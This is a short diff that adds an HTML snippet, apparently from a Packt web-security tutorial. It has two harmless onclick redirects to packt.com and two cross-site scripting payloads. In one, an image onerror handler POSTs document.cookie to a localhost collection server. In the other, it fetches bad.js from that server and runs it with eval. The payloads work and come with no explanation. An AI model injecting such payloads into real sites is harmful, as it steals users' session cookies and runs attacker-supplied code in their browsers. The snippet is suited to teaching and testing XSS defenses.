@@ -1,0 +1,7 @@
+<img src="http://localhost:9999/city.png" onclick="location='http://packt.com'">
+
+<button class="btn btn-danger" onclick="location='http://packt.com'">Click</button>
+
+<img src="nope" onerror="fetch('http://localhost:9999', { method: 'POST', body:document.cookie})"/>
+
+<img src="nope" onerror="fetch('http://localhost:9999/bad.js').then(r => r.text()).then(t => eval(t))">
